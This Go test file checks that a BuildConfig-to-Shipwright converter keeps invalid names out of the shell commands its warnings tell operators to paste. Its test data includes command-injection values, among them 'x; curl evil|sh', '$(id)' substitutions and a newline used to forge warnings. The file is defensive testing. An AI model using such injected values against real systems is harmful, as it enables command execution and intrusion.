//go:build !documentation

package buildconfig

import (
	"strings"
	"testing"

	buildv1 "github.com/openshift/api/build/v1"
	logrustest "github.com/sirupsen/logrus/hooks/test"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/validation"
)

const invalidNameWarnMarker = "which is not a valid Kubernetes name"

func TestCommandArg(t *testing.T) {
	tests := []struct {
		name  string
		value string
		check func(string) []string
		want  string
	}{
		{"valid label", "myns", validation.IsDNS1123Label, "myns"},
		{"dotted subdomain", "ci.builder", validation.IsDNS1123Subdomain, "ci.builder"},
		{"dotted label", "ci.builder", validation.IsDNS1123Label, "<p>"},
		{"empty label", "", validation.IsDNS1123Label, "<p>"},
		{"empty subdomain", "", validation.IsDNS1123Subdomain, "<p>"},
		{"metacharacter", "x; curl evil|sh", validation.IsDNS1123Subdomain, "<p>"},
		{"newline", "x\nFAKE", validation.IsDNS1123Subdomain, "<p>"},
		{"command substitution", "a$(id)", validation.IsDNS1123Subdomain, "<p>"},
		{"leading dash", "-n", validation.IsDNS1123Subdomain, "<p>"},
		{"uppercase", "Builder", validation.IsDNS1123Subdomain, "<p>"},
		{"spelled like the placeholder", "<p>", validation.IsDNS1123Subdomain, "<p>"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, valid := commandArg(tt.value, "<p>", tt.check)
			if got != tt.want {
				t.Errorf("commandArg(%q) = %q, want %q", tt.value, got, tt.want)
			}
			if wantValid := got == tt.value && tt.want != "<p>"; valid != wantValid {
				t.Errorf("commandArg(%q) valid = %v, want %v", tt.value, valid, wantValid)
			}
		})
	}
}

// convertForCommandNames converts bc and returns the Build's annotations and the
// recorded warnings.
func convertForCommandNames(t *testing.T, bc *buildv1.BuildConfig) (map[string]string, []string) {
	t.Helper()
	logger, _ := logrustest.NewNullLogger()
	c := &Converter{Log: logger}
	resources, outcome := c.Convert(bc)
	if outcome.State == OutcomeFailed || outcome.State == OutcomeSkipped {
		t.Fatalf("conversion %s: %s", outcome.State, outcome.Reason)
	}
	for _, r := range resources {
		if r.GetKind() == "Build" {
			return r.GetAnnotations(), outcome.Warnings
		}
	}
	t.Fatal("no Build in the conversion output")
	return nil, nil
}

func commandNamesBC(namespace, serviceAccount, pullSecret string, binary bool) *buildv1.BuildConfig {
	bc := &buildv1.BuildConfig{
		ObjectMeta: metav1.ObjectMeta{Name: "app", Namespace: namespace},
		Spec: buildv1.BuildConfigSpec{
			CommonSpec: buildv1.CommonSpec{
				ServiceAccount: serviceAccount,
				Source: buildv1.BuildSource{
					Type: buildv1.BuildSourceGit,
					Git:  &buildv1.GitBuildSource{URI: "https://github.com/example/app.git"},
				},
				Strategy: buildv1.BuildStrategy{
					Type:           buildv1.DockerBuildStrategyType,
					DockerStrategy: &buildv1.DockerBuildStrategy{},
				},
				Output: buildv1.BuildOutput{
					To: &corev1.ObjectReference{Kind: "DockerImage", Name: "quay.io/example/app:latest"},
				},
			},
		},
	}
	if pullSecret != "" {
		bc.Spec.Strategy.DockerStrategy.PullSecret = &corev1.LocalObjectReference{Name: pullSecret}
	}
	if binary {
		bc.Spec.Source = buildv1.BuildSource{Type: buildv1.BuildSourceBinary, Binary: &buildv1.BinaryBuildSource{}}
	}
	return bc
}

// convertForCommandNamesWithOpts is convertForCommandNames but also lets a
// test set PluginOptionalFields — an invalid --default-build-strategy value
// (BUILD-2439) only reaches the converter through StrategyMapping.
func convertForCommandNamesWithOpts(t *testing.T, bc *buildv1.BuildConfig, opts PluginOptionalFields) (map[string]string, []string) {
	t.Helper()
	logger, _ := logrustest.NewNullLogger()
	c := &Converter{Log: logger, Opts: opts}
	resources, outcome := c.Convert(bc)
	if outcome.State == OutcomeFailed || outcome.State == OutcomeSkipped {
		t.Fatalf("conversion %s: %s", outcome.State, outcome.Reason)
	}
	for _, r := range resources {
		if r.GetKind() == "Build" {
			return r.GetAnnotations(), outcome.Warnings
		}
	}
	t.Fatal("no Build in the conversion output")
	return nil, nil
}

// withTrustedCAVolume adds a Docker strategy volume named "trusted-ca" to bc,
// which triggers W78.
func withTrustedCAVolume(bc *buildv1.BuildConfig) *buildv1.BuildConfig {
	bc.Spec.Strategy.DockerStrategy.Volumes = []buildv1.BuildVolume{
		{
			Name: TrustedCAVolumeName,
			Source: buildv1.BuildVolumeSource{
				Type:   buildv1.BuildVolumeSourceTypeSecret,
				Secret: &corev1.SecretVolumeSource{SecretName: "ca-bundle"},
			},
			Mounts: []buildv1.BuildVolumeMount{{DestinationPath: "/etc/pki/ca-trust/source/anchors"}},
		},
	}
	return bc
}

// withMountTrustedCA sets bc.Spec.MountTrustedCA, which triggers W76.
func withMountTrustedCA(bc *buildv1.BuildConfig) *buildv1.BuildConfig {
	mount := true
	bc.Spec.MountTrustedCA = &mount
	return bc
}

// withSourceStrategy swaps bc to a Source strategy whose pull secret is pullSecret.
func withSourceStrategy(bc *buildv1.BuildConfig, pullSecret string) *buildv1.BuildConfig {
	bc.Spec.Strategy = buildv1.BuildStrategy{
		Type: buildv1.SourceBuildStrategyType,
		SourceStrategy: &buildv1.SourceBuildStrategy{
			From:       corev1.ObjectReference{Kind: "DockerImage", Name: "registry.example.com/builder:latest"},
			PullSecret: &corev1.LocalObjectReference{Name: pullSecret},
		},
	}
	return bc
}

// BUILD-2439: a name the API server would reject never reaches a command a
// warning tells the operator to paste; a placeholder takes its place and one
// warning names the bad value. Valid names, dotted ones included, paste as is.
func TestCommandNamesKeepInvalidNamesOutOfCommands(t *testing.T) {
	tests := []struct {
		name        string
		bc          *buildv1.BuildConfig
		want        []string // substrings some warning must contain
		wantNot     []string // substrings no warning may contain
		wantInvalid []string // one invalid-name warning per entry, naming it
	}{
		{
			name:        "W8 metacharacter in the ServiceAccount",
			bc:          commandNamesBC("myns", "x; curl evil|sh", "my-pull-secret", false),
			want:        []string{"oc -n myns secrets link <serviceaccount> my-pull-secret --for=pull,mount"},
			wantNot:     []string{"secrets link x;"},
			wantInvalid: []string{`ServiceAccount "x; curl evil|sh"`},
		},
		{
			name:        "W8 invalid pull secret",
			bc:          commandNamesBC("myns", "custom-builder-sa", "bad$(id)", false),
			want:        []string{"oc -n myns secrets link custom-builder-sa <pull-secret> --for=pull,mount"},
			wantNot:     []string{"custom-builder-sa bad$(id)"},
			wantInvalid: []string{`pull secret "bad$(id)"`},
		},
		{
			name: "W8 and W72 share one invalid namespace",
			bc:   commandNamesBC("bad ns", "builder", "my-pull-secret", false),
			want: []string{
				"oc -n <namespace> secrets link builder my-pull-secret --for=pull,mount",
				"oc -n <namespace> get serviceaccount builder",
				"-z <sa> -n <namespace>,",
			},
			wantNot:     []string{"-n bad ns"},
			wantInvalid: []string{`namespace "bad ns"`},
		},
		{
			name:        "W73 invalid ServiceAccount on a binary build",
			bc:          commandNamesBC("myns", "a$(id)", "", true),
			want:        []string{"--sa-name <serviceaccount>.", "carried by <serviceaccount> is not used"},
			wantNot:     []string{"--sa-name a$(id)"},
			wantInvalid: []string{`ServiceAccount "a$(id)"`},
		},
		{
			name:        "ServiceAccount spelled like its placeholder",
			bc:          commandNamesBC("myns", "<serviceaccount>", "my-pull-secret", false),
			want:        []string{"oc -n myns secrets link <serviceaccount> my-pull-secret --for=pull,mount"},
			wantInvalid: []string{`ServiceAccount "<serviceaccount>"`},
		},
		{
			// An empty namespace would shift "secrets" into the -n position.
			// It names nothing to correct, so it gets no W81.
			name: "empty namespace",
			bc:   commandNamesBC("", "builder", "my-pull-secret", false),
			want: []string{
				"oc -n <namespace> secrets link builder my-pull-secret --for=pull,mount",
				"oc -n <namespace> get serviceaccount builder",
			},
			wantNot: []string{"oc -n  "},
		},
		{
			name:        "invalid pull secret on a BuildConfig that names no ServiceAccount",
			bc:          commandNamesBC("myns", "", "bad$(id)", false),
			wantNot:     []string{"secrets link"},
			wantInvalid: []string{`pull secret "bad$(id)"`},
		},
		{
			name:        "Source strategy pull secret",
			bc:          withSourceStrategy(commandNamesBC("myns", "custom-builder-sa", "", false), "bad$(id)"),
			want:        []string{"oc -n myns secrets link custom-builder-sa <pull-secret> --for=pull,mount"},
			wantInvalid: []string{`pull secret "bad$(id)"`},
		},
		{
			name: "dotted ServiceAccount is valid",
			bc:   commandNamesBC("myns", "ci.builder", "my-pull-secret", false),
			want: []string{"oc -n myns secrets link ci.builder my-pull-secret --for=pull,mount"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, warns := convertForCommandNames(t, tt.bc)
			for _, s := range tt.want {
				if countContaining(warns, s) == 0 {
					t.Errorf("no warning contains %q:\n%s", s, strings.Join(warns, "\n"))
				}
			}
			for _, s := range tt.wantNot {
				if n := countContaining(warns, s); n != 0 {
					t.Errorf("%d warning(s) contain %q:\n%s", n, s, strings.Join(warns, "\n"))
				}
			}
			if n := countContaining(warns, invalidNameWarnMarker); n != len(tt.wantInvalid) {
				t.Errorf("invalid-name warnings = %d, want %d:\n%s", n, len(tt.wantInvalid), strings.Join(warns, "\n"))
			}
			for _, s := range tt.wantInvalid {
				if countContaining(warns, "names "+s+", "+invalidNameWarnMarker) != 1 {
					t.Errorf("no single invalid-name warning names %s:\n%s", s, strings.Join(warns, "\n"))
				}
			}
		})
	}
}

// BUILD-2439: --default-build-strategy reaches the converter unvalidated, and
// W76 and W78 paste b.Spec.Strategy.Name into an `oc get clusterbuildstrategy`
// command. An injection-style override must not reach either command.
func TestCommandNamesKeepInvalidStrategyOutOfCommands(t *testing.T) {
	tests := []struct {
		name string
		bc   *buildv1.BuildConfig
	}{
		{
			name: "W78 trusted-ca strategy volume",
			bc:   withTrustedCAVolume(commandNamesBC("myns", "", "", false)),
		},
		{
			name: "W76 mountTrustedCA",
			bc:   withMountTrustedCA(commandNamesBC("myns", "", "", false)),
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, warns := convertForCommandNamesWithOpts(t, tt.bc, PluginOptionalFields{
				StrategyMapping: map[string]string{"docker": "x;id"},
			})
			if countContaining(warns, "oc get clusterbuildstrategy <strategy> -o jsonpath") == 0 {
				t.Errorf("no warning contains the placeholder command:\n%s", strings.Join(warns, "\n"))
			}
			if n := countContaining(warns, "oc get clusterbuildstrategy x;id"); n != 0 {
				t.Errorf("%d warning(s) put the raw strategy override in the command:\n%s", n, strings.Join(warns, "\n"))
			}
			if countContaining(warns, `build strategy "x;id", `+invalidNameWarnMarker) != 1 {
				t.Errorf("no single invalid-name warning names the strategy override:\n%s", strings.Join(warns, "\n"))
			}
		})
	}
}

// A valid --default-build-strategy override, dotted included, pastes as is.
func TestCommandNamesValidStrategyOverridePastesAsIs(t *testing.T) {
	bc := withMountTrustedCA(commandNamesBC("myns", "", "", false))
	_, warns := convertForCommandNamesWithOpts(t, bc, PluginOptionalFields{
		StrategyMapping: map[string]string{"docker": "my.custom-strategy"},
	})
	if countContaining(warns, "oc get clusterbuildstrategy my.custom-strategy -o jsonpath") == 0 {
		t.Errorf("no warning contains the resolved strategy command:\n%s", strings.Join(warns, "\n"))
	}
	if n := countContaining(warns, invalidNameWarnMarker); n != 0 {
		t.Errorf("%d unexpected invalid-name warning(s):\n%s", n, strings.Join(warns, "\n"))
	}
}

// The binary-source warnings used to print the raw BuildConfig name in
// 'shp build upload', which names no Build once uniqueName rewrites it and
// carried shell characters into the command.
func TestCommandNamesBinaryUploadNamesTheBuild(t *testing.T) {
	for _, asFile := range []string{"", "app.jar"} {
		t.Run("asFile="+asFile, func(t *testing.T) {
			bc := commandNamesBC("myns", "", "", true)
			bc.Name = "My_App;id"
			bc.Spec.Source.Binary.AsFile = asFile
			logger, _ := logrustest.NewNullLogger()
			c := &Converter{Log: logger}
			resources, outcome := c.Convert(bc)
			var buildName string
			for _, r := range resources {
				if r.GetKind() == "Build" {
					buildName = r.GetName()
				}
			}
			if buildName == "" || buildName == bc.Name {
				t.Fatalf("expected a rewritten Build name, got %q", buildName)
			}
			if countContaining(outcome.Warnings, "shp build upload "+buildName+" <directory>") == 0 {
				t.Errorf("no warning names Build %s in the upload command:\n%s", buildName, strings.Join(outcome.Warnings, "\n"))
			}
			if n := countContaining(outcome.Warnings, "shp build upload My_App;id"); n != 0 {
				t.Errorf("%d warning(s) put the raw BuildConfig name in the upload command", n)
			}
		})
	}
}

// A newline in the ServiceAccount used to split the conversion-warnings
// annotation, so the text after it read as a warning of its own.
func TestCommandNamesNewlineCannotForgeAWarning(t *testing.T) {
	annotations, warns := convertForCommandNames(t, commandNamesBC("myns", "x\nFAKE", "my-pull-secret", false))
	lines := strings.Split(annotations[ConversionWarningsAnnotation], "\n")
	if len(lines) != len(warns) {
		t.Errorf("annotation has %d lines for %d warnings:\n%s", len(lines), len(warns), annotations[ConversionWarningsAnnotation])
	}
	for _, l := range lines {
		if strings.HasPrefix(l, "FAKE") {
			t.Errorf("annotation line starts with the injected text: %q", l)
		}
	}
}

// The BuildRun template is YAML, not shell, and keeps the name the BuildConfig
// gave; the target's admission rejects it there.
func TestCommandNamesTemplateKeepsRawServiceAccount(t *testing.T) {
	annotations, _ := convertForCommandNames(t, commandNamesBC("myns", "a$(id)", "", true))
	if tmpl := annotations[BuildRunTemplateAnnotation]; !strings.Contains(tmpl, "a$(id)") {
		t.Errorf("BuildRun template lost the ServiceAccount name:\n%s", tmpl)
	}
}
